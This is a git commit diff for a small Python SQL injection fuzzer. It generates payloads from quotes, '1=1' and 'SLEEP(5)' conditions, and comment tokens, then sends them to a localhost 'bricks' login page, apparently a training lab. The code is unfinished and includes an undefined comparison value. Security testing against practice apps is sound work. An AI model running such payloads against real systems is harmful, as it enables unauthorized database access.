1b83d90e1b10a0189bf1d26078ead881a58ef0c1
amitayabudy198 <amitayabudy198@gmail.com>
2020-06-08 15:40:16 +0300

    Changes to be committed: 	modified:   fuzzer.py 	modified:   sql_generator.py Added logi to sql_gemnerator and added the changes to the fuzzerX

--- fuzzer.py
+++ fuzzer.py
@@ -1,12 +1,23 @@
 import sys
 
-from sql_generator import create
+from sql_generator import *
 from tester import payload_check
 
 
 def main(URL):
-    s = create()
-    print(payload_check(URL, s))
+    s_list = []
+    for i in range(3):
+        s_list.append(new_string())
+
+    check_list = []
+    for id, s in s_list:
+        for i in range(3):
+            check_list.append(add_command(id))
+
+    for id, s in check_list:
+        check = payload_check(URL, s)
+        if check != normal:
+            print(check, s)
 
 if __name__ == '__main__':
     URL = "http://localhost/bricks/login-1/index.php"
--- sql_generator.py
+++ sql_generator.py
@@ -1,8 +1,57 @@
 import random
+import uuid
 
-opening_group = ["\'", "\"", ")", "("]
-commands_group = ["OR 1=1", "SLEEP(5)"]
+opening_group = ["\'", "\"", ")"]
+commands_group = ["1=1", "SLEEP(5)", "1=0"]
 comment_group = ["--", ";", "/*"]
+
+open_strings = {} # This dict contains all the generated strings
+command_strings = {}
+
+def new_string():
+    """
+    This function creates a new opening string.
+    The function returns the string id, and the string itself
+    """
+    id = uuid.uuid4()
+    s = ""
+
+    for i in range(random.randrange(1, 4)):
+        s += random.choice(opening_group)
+
+    s += " "
+
+    for check_id in open_strings.keys(): # Temporary solution! Needs more work
+        if s == open_strings[check_id]:
+            return new_string()
+
+    open_strings[id] = s
+    command_strings[id] = {}
+
+    return id, s
+
+def add_command(id):
+    """
+    This function takes an id of an opening string, and creates a test string.
+    The function stores the test string with the same id in command_strings
+    and using a new id for the second dict.
+    The function returns the second id with the test string itself.
+    """
+    second_id = uuid.uuid4()
+    s = open_strings[id]
+
+    s += random.choice(["AND", "OR", ""]) + " "
+    s += random.choice(commands_group) + " "
+
+    command_dict = command_strings[id]
+
+    for check_id in command_dict.keys(): # Temporary solution! Needs more work
+        if s == command_dict[check_id]:
+            return add_command(id)
+
+    command_dict[second_id] = s
+    return second_id, s
+
 
 def create():
     s = ""
@@ -12,4 +61,4 @@ def create():
     return s
 
 if __name__ == '__main__':
-    print(create())
+    pass
